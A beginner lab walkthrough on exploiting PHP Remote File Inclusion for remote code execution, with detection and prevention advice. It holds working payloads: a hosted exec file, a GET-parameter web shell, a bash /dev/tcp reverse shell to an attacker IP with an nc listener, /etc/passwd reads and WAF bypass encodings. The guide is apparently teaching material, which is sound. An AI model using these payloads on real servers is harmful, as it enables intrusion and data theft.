# Remote Code Execution (RCE) via PHP File Inclusion - Lab Guide

## Lab Overview

**Objective**: Exploit a Remote File Inclusion (RFI) vulnerability to execute arbitrary commands on the target server and retrieve the hostname.

**Difficulty**: Beginner  
**Time Required**: 10-15 minutes  
**Vulnerability Type**: Remote File Inclusion (RFI) → Remote Code Execution (RCE)

---

## Table of Contents
1. [Understanding the Vulnerability](#understanding-the-vulnerability)
2. [Prerequisites](#prerequisites)
3. [Step-by-Step Exploitation](#step-by-step-exploitation)
4. [Advanced Techniques](#advanced-techniques)
5. [Prevention & Remediation](#prevention--remediation)

---

## Understanding the Vulnerability

### What is Remote File Inclusion (RFI)?

**Definition**: RFI allows an attacker to include remote files (from external servers) into the vulnerable application.

**Vulnerable Code Example**:
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**When visiting**:
```
http://vulnerable-site.com/index.php?file=about.php
```

**The application executes**:
```php
include('about.php');
```

---

### Why This Leads to RCE

**Normal behavior**:
```
http://vulnerable-site.com/index.php?file=about.php
→ Includes local file: about.php
```

**Attacker exploitation**:
```
http://vulnerable-site.com/index.php?file=http://attacker.com/shell.txt
→ Includes remote file from attacker's server
→ Executes malicious PHP code
→ Remote Code Execution achieved!
```

---

### Required PHP Configuration

For RFI to work, the target server must have these settings enabled:

```ini
allow_url_fopen = On
allow_url_include = On
```

**Check if these are enabled**:
```php
<?php
echo "allow_url_fopen: " . ini_get('allow_url_fopen') . "\n";
echo "allow_url_include: " . ini_get('allow_url_include') . "\n";
?>
```

**Note**: In this lab, we're told these settings are **already enabled** on the target.

---

## Prerequisites

### Required Tools

- **Text editor** (VS Code, Sublime, nano, vim)
- **Python 3** or **PHP** (for hosting the malicious file)
- **Terminal/Command Prompt**
- **Web browser**
- **Target IP address** and **Your local IP address**

### Finding Your Local IP

**Linux/Mac**:
```bash
# Option 1
ifconfig

# Option 2
ip addr show

# Option 3
hostname -I
```

**Windows**:
```cmd
ipconfig
```

**Look for**: Your local network IP (usually `192.168.x.x` or `10.0.x.x`)

**Example**: `192.168.1.100`

---

## Step-by-Step Exploitation

### Step 1: Create the Malicious PHP File

**Objective**: Create a file containing PHP code that will execute system commands.

**Instructions**:

1. Open your text editor
2. Create a new file named `test.txt`
3. Add the following PHP code:

```php
<?php
echo exec("hostname");
?>
```

**Save the file as**: `test.txt`

**File location**: Save in an easily accessible directory
- Linux/Mac: `/home/username/`
- Windows: `C:\Users\username\`

---

### Understanding the Payload

```php
<?php
echo exec("hostname");
?>
```

**Breaking it down**:

| Component | Purpose |
|-----------|---------|
| `<?php ?>` | PHP opening and closing tags |
| `exec()` | Executes system-level commands |
| `"hostname"` | Command to execute (gets server hostname) |
| `echo` | Prints the output to the screen |

**What happens**:
1. Server includes your remote file
2. PHP interpreter executes the code
3. `exec("hostname")` runs the `hostname` command on the server
4. `echo` displays the result
5. You see the server's hostname in the response

---

### Step 2: Start a Local Web Server

**Objective**: Host your malicious file so the target can access it.

**Choose one method below:**

#### Method 1: Python HTTP Server (Recommended)

```bash
# Navigate to the directory containing test.txt
cd /path/to/directory

# Start Python web server on port 8000
python3 -m http.server 8000
```

**Expected output**:
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Method 2: PHP Built-in Server

```bash
# Navigate to the directory containing test.txt
cd /path/to/directory

# Start PHP web server on port 8000
php -S 0.0.0.0:8000
```

**Expected output**:
```
PHP 8.x Development Server (http://0.0.0.0:8000) started
```

---

### Why use 0.0.0.0?

**0.0.0.0** means:
- Listen on **all network interfaces**
- Accessible from other machines on the network
- Not just `localhost` (127.0.0.1)

**Alternative**: Use your specific IP
```bash
python3 -m http.server 8000 --bind 192.168.1.100
```

---

### Verify Your Server is Running

**Open browser and visit**:
```
http://localhost:8000/
```

**You should see**:
- Directory listing with `test.txt`
- OR a simple web interface

**Test the file directly**:
```
http://localhost:8000/test.txt
```

**You should see**:
```php
<?php
echo exec("hostname");
?>
```

---

### Step 3: Identify the Vulnerable Parameter

**Objective**: Find the parameter that includes files.

**Common vulnerable parameters**:
```
?file=
?page=
?include=
?load=
?doc=
?document=
?path=
?template=
```

**Example vulnerable URL**:
```
http://target-site.com/index.php?file=home.php
```

**In this lab**: The parameter is `file=`

---

### Step 4: Construct the Exploit URL

**Format**:
```
http://target-site.com/index.php?file=http://YOUR_IP:PORT/FILENAME
```

**Replace**:
- `YOUR_IP` → Your local IP address
- `PORT` → The port your server is running on
- `FILENAME` → The name of your malicious file

**Example with actual values**:
```
http://target-site.com/index.php?file=http://192.168.1.100:8000/test.txt
```

---

### Step 5: Execute the Attack

**Instructions**:

1. **Open your browser**
2. **Navigate to the target site**
3. **In the URL bar, enter your exploit URL**:
   ```
   http://target-site.com/index.php?file=http://192.168.1.100:8000/test.txt
   ```
4. **Press Enter**

---

### Step 6: Verify Successful Exploitation

**Check your terminal** (where the web server is running):

**You should see**:
```
192.168.x.x - - [DD/Mon/YYYY HH:MM:SS] "GET /test.txt HTTP/1.0" 200 -
```

**This confirms**:
- ✅ Target server accessed your file
- ✅ File was successfully included
- ✅ HTTP 200 = Success

---

### Step 7: View the Results

**In your browser, you should see**:

```
webapp-server-01
```

**Or something like**:
```
ip-172-31-45-67
ubuntu-web-server
prod-server-03
```

**Success!** You've retrieved the server's hostname! 🎯

---

## Visual Attack Flow

```
┌─────────────────────────────────────────────────┐
│  Step 1: Create Malicious File                  │
│  test.txt → <?php echo exec("hostname"); ?>    │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 2: Start Local Web Server                 │
│  python3 -m http.server 8000                    │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Step 3: Access Target with Exploit URL         │
│  ?file=http://192.168.1.100:8000/test.txt      │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Target Server Requests Your File               │
│  GET http://192.168.1.100:8000/test.txt        │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Server Executes PHP Code                        │
│  exec("hostname") runs on target                │
└──────────────────┬──────────────────────────────┘
                   ↓
┌─────────────────────────────────────────────────┐
│  Result Displayed in Browser                     │
│  "webapp-server-01"                             │
└─────────────────────────────────────────────────┘
```

---

## Advanced Techniques

### Different Commands to Execute

**Once you have RCE, you can execute any command:**

#### Get Current User
```php
<?php
echo exec("whoami");
?>
```

#### List Files in Current Directory
```php
<?php
echo exec("ls -la");
?>
```

#### Display Current Working Directory
```php
<?php
echo exec("pwd");
?>
```

#### Check Operating System
```php
<?php
echo exec("uname -a");
?>
```

#### Read Sensitive Files
```php
<?php
echo exec("cat /etc/passwd");
?>
```

#### Get Network Configuration
```php
<?php
echo exec("ifconfig");
?>
```

---

### Using shell_exec() Instead of exec()

**Difference**:
- `exec()` → Returns last line of output
- `shell_exec()` → Returns full output

**Better for multi-line output**:
```php
<?php
echo shell_exec("ls -la");
?>
```

**Output**:
```
total 48
drwxr-xr-x  8 www-data www-data 4096 Jan 15 10:30 .
drwxr-xr-x 18 root     root     4096 Jan 10 08:15 ..
-rw-r--r--  1 www-data www-data  220 Jan 01 00:00 index.php
-rw-r--r--  1 www-data www-data 3520 Jan 05 12:45 config.php
```

---

### Using system()

**Another alternative**:
```php
<?php
system("hostname");
?>
```

**Automatically prints output** (no need for `echo`)

---

### Using passthru()

**For binary data**:
```php
<?php
passthru("cat /etc/passwd");
?>
```

---

### Interactive Web Shell

**Create a full web shell**: `shell.txt`

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Usage: ?cmd=<command>";
}
?>
```

**Usage**:
```
http://target.com/index.php?file=http://192.168.1.100:8000/shell.txt&cmd=whoami
http://target.com/index.php?file=http://192.168.1.100:8000/shell.txt&cmd=ls+-la
http://target.com/index.php?file=http://192.168.1.100:8000/shell.txt&cmd=cat+/etc/passwd
```

---

### Reverse Shell Payload

**Establish a reverse shell**: `revshell.txt`

```php
<?php
$ip = '192.168.1.100';  // Your IP
$port = 4444;           // Your listening port
exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
```

**On your machine** (before triggering):
```bash
nc -lvnp 4444
```

**Then trigger the payload**:
```
http://target.com/index.php?file=http://192.168.1.100:8000/revshell.txt
```

**Result**: Full interactive shell on the target server!

---

## Troubleshooting

### Problem: "Failed to open stream"

**Error message**:
```
Warning: include(): Failed to open stream: HTTP request failed!
```

**Possible causes**:

1. **Your web server isn't running**
   - Solution: Restart `python3 -m http.server 8000`

2. **Wrong IP address**
   - Solution: Verify with `ifconfig` or `ipconfig`

3. **Firewall blocking**
   - Solution: Temporarily disable firewall or allow port 8000

4. **Network not reachable**
   - Solution: Ensure target can reach your IP

---

### Problem: "allow_url_include is disabled"

**Error message**:
```
Warning: include(): http:// wrapper is disabled in the server configuration
```

**Cause**: `allow_url_include = Off` in php.ini

**Solution**: This lab won't work on this target. Try:
- Local File Inclusion (LFI) techniques
- Different target
- Convince admin to enable (unlikely)

---

### Problem: File downloads instead of executing

**Symptom**: Browser downloads `test.txt` instead of executing it

**Cause**: Target isn't treating it as PHP code

**Solutions**:

1. **Rename with .php extension**:
   ```
   mv test.txt test.php
   ```

2. **Add PHP content-type header** in your file:
   ```php
   <?php
   header('Content-Type: text/html');
   echo exec("hostname");
   ?>
   ```

3. **Use different wrapper**:
   ```
   ?file=php://filter/resource=http://192.168.1.100:8000/test.txt
   ```

---

### Problem: "No output displayed"

**Symptom**: Page loads but shows nothing

**Debug steps**:

1. **Add visible output**:
   ```php
   <?php
   echo "Script executed!<br>";
   echo "Hostname: " . exec("hostname");
   ?>
   ```

2. **Check for errors**:
   ```php
   <?php
   error_reporting(E_ALL);
   ini_set('display_errors', 1);
   echo exec("hostname");
   ?>
   ```

3. **Test command locally**:
   ```bash
   php test.txt
   ```

---

### Problem: "Connection refused"

**Error**: ERR_CONNECTION_REFUSED

**Solutions**:

1. **Check server is running**:
   ```bash
   netstat -tuln | grep 8000
   ```

2. **Try different port**:
   ```bash
   python3 -m http.server 9000
   ```

3. **Check firewall**:
   ```bash
   # Linux
   sudo ufw allow 8000
   
   # Windows
   # Add firewall rule for port 8000
   ```

---

## Detection & Monitoring

### How to Detect RFI Attacks

**Server-side indicators**:

1. **Access logs show external HTTP requests**:
   ```
   192.168.1.100 - - [15/Jan/2024:10:30:15] "GET /test.txt HTTP/1.0" 200
   ```

2. **PHP errors in logs**:
   ```
   include(http://attacker.com/shell.txt): failed to open stream
   ```

3. **Outbound HTTP connections** to unusual IPs

4. **Suspicious process execution**:
   ```bash
   # Monitor with:
   ps aux | grep php
   ```

---

### WAF/IDS Signatures

**Common detection patterns**:
```
file=http://
page=ftp://
include=https://
load=php://
```

**Bypass techniques** (advanced):
```
# URL encoding
file=http%3A%2F%2F192.168.1.100

# Double encoding
file=http%253A%252F%252F192.168.1.100

# Case variation
file=HtTp://192.168.1.100

# Null byte (older PHP)
file=http://192.168.1.100/shell.txt%00
```

---

## Prevention & Remediation

### For Developers

#### 1. Disable allow_url_include

**In php.ini**:
```ini
allow_url_include = Off
```

**This prevents remote file inclusion entirely.**

---

#### 2. Input Validation - Whitelist Approach

**Bad (Vulnerable)**:
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**Good (Secure)**:
```php
<?php
$allowed_files = ['home', 'about', 'contact'];
$file = $_GET['file'];

if (in_array($file, $allowed_files)) {
    include($file . '.php');
} else {
    die('Invalid file requested');
}
?>
```

---

#### 3. Path Traversal Prevention

```php
<?php
$file = basename($_GET['file']); // Remove directory paths
$file = str_replace(['../', '..\\'], '', $file); // Remove traversal
include('pages/' . $file);
?>
```

---

#### 4. Use Absolute Paths

```php
<?php
$base_dir = '/var/www/html/pages/';
$file = basename($_GET['file']);
$full_path = realpath($base_dir . $file);

// Ensure file is within base directory
if (strpos($full_path, $base_dir) === 0 && file_exists($full_path)) {
    include($full_path);
} else {
    die('Invalid file');
}
?>
```

---

#### 5. Content Security Policy

**Add CSP headers**:
```php
<?php
header("Content-Security-Policy: default-src 'self'");
?>
```

---

### Security Checklist

```
☐ allow_url_include = Off in php.ini
☐ Whitelist allowed files
☐ Validate and sanitize all input
☐ Use absolute paths
☐ Implement path traversal prevention
☐ Enable error logging (disable error display)
☐ Regular security audits
☐ Keep PHP updated
☐ Implement WAF rules
☐ Monitor access logs
```

---

## Lab Completion Checklist

```
☐ Created malicious PHP file (test.txt)
☐ Started local web server (Python/PHP)
☐ Identified vulnerable parameter (file=)
☐ Constructed exploit URL
☐ Executed attack
☐ Verified server access in logs
☐ Retrieved hostname from target
☐ Documented findings
☐ Understood the attack flow
☐ Learned prevention techniques
```

---

## Summary

### What You Learned

✅ **Remote File Inclusion (RFI)** vulnerability  
✅ **Remote Code Execution (RCE)** via RFI  
✅ **PHP functions**: `exec()`, `system()`, `shell_exec()`  
✅ **Setting up local web server** with Python/PHP  
✅ **Exploiting file inclusion** vulnerabilities  
✅ **Executing system commands** remotely  
✅ **Prevention techniques** for developers  

---

### Attack Summary

```
1. Create malicious file → test.txt with PHP code
2. Host file locally → python3 -m http.server 8000
3. Identify vulnerable parameter → file=
4. Construct exploit → ?file=http://YOUR_IP:8000/test.txt
5. Execute attack → Access the URL
6. Retrieve result → View hostname in browser
```

---

### Key Takeaways

🔑 **RFI + RCE** is a critical vulnerability  
🔑 **allow_url_include** must be enabled for RFI  
🔑 **Always validate and sanitize** user input  
🔑 **Whitelist** approach is best for file inclusion  
🔑 **Disable dangerous PHP settings** in production  

---

## Additional Resources

### Practice Platforms
- [DVWA](http://www.dvwa.co.uk/) - File Inclusion section
- [bWAPP](http://www.itsecgames.com/) - Remote/Local File Inclusion
- [WebGoat](https://github.com/WebGoat/WebGoat)
- [HackTheBox](https://www.hackthebox.eu/) - Various boxes

### Further Reading
- [OWASP - File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PHP Manual - include()](https://www.php.net/manual/en/function.include.php)
- [PHP Security Guide](https://phpsecurity.readthedocs.io/)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [Nikto](https://github.com/sullo/nikto)
- [Metasploit](https://www.metasploit.com/)

---